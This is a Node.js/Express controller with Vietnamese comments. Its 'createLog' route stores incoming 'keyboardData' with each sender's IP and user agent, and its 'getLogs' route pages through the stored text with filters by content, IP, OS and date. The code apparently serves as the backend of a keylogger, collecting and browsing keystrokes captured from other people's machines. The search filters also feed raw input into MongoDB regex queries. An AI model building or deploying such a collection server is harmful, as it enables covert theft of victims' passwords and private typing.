const Log = require('../models/Log');

// @desc    Lấy danh sách log có phân trang và hỗ trợ bộ lọc (Search, IP, OS, Ngày tháng)
// @route   GET /api/logs
exports.getLogs = async (req, res) => {
    try {
        let { page = 1, limit = 15, search, ip, os, startDate, endDate } = req.query;
        page = parseInt(page);
        limit = parseInt(limit);
        const skip = (page - 1) * limit;

        let query = {};

        // 1. Lọc theo nội dung
        if (search) {
            query.content = { $regex: search, $options: "i" };
        }
        // 2. Lọc theo IP
        if (ip) {
            query.clientIp = { $regex: ip, $options: "i" };
        }
        // 3. Lọc theo hệ điều hành (User Agent)
        if (os) {
            query.userAgent = { $regex: os, $options: "i" };
        }
        // 4. Lọc theo khoảng thời gian ngày tháng
        if (startDate || endDate) {
            query.createdAt = {};
            if (startDate) {
                query.createdAt.$gte = new Date(startDate);
            }
            if (endDate) {
                const endDateTime = new Date(endDate);
                endDateTime.setHours(23, 59, 59, 999);
                query.createdAt.$lte = endDateTime;
            }
        }

        // Đếm tổng số bản ghi thỏa mãn điều kiện
        const totalLogs = await Log.countDocuments(query);
        const totalPages = Math.ceil(totalLogs / limit) || 1;

        // Truy vấn dữ liệu phân trang và sắp xếp mới nhất lên đầu
        const logs = await Log.find(query)
            .sort({ createdAt: -1 })
            .skip(skip)
            .limit(limit);

        res.json({
            logs,
            currentPage: page,
            totalPages,
            totalLogs
        });
    } catch (error) {
        console.error("Lỗi đọc DB:", error);
        res.status(500).json({ error: "Lỗi server khi lấy dữ liệu" });
    }
};

// @desc    Lưu log mới từ Client gửi lên
// @route   POST /
exports.createLog = async (req, res) => {
    try {
        console.log("Body nhận từ client:", req.body);

        const content = req.body.keyboardData;
        if (!content || !content.trim()) {
            return res.status(200).send({ status: "ignored" });
        }

        // Lấy IP chuẩn
        let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
        if (clientIp === "::1" || clientIp === "::ffff:127.0.0.1") {
            clientIp = "127.0.0.1";
        }

        const userAgent = req.headers['user-agent'] || "Unknown OS";

        const newLog = new Log({
            clientIp,
            userAgent,
            content
        });

        await newLog.save();
        res.status(200).send("Successfully set the data to MongoDB");
    } catch (error) {
        console.error("Lỗi lưu DB:", error);
        res.status(500).send("Error saving data");
    }
};